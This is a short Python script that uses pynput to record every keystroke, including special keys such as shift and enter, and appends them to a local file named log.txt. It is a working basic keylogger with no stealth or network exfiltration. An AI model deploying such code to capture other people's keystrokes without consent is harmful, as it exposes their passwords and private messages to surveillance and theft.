from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            # This will catch alphanumeric characters
            f.write(key.char)
        except AttributeError:
            # This catches special keys like space, enter, shift, etc.
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key.name}]')  # e.g. [shift], [ctrl]

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
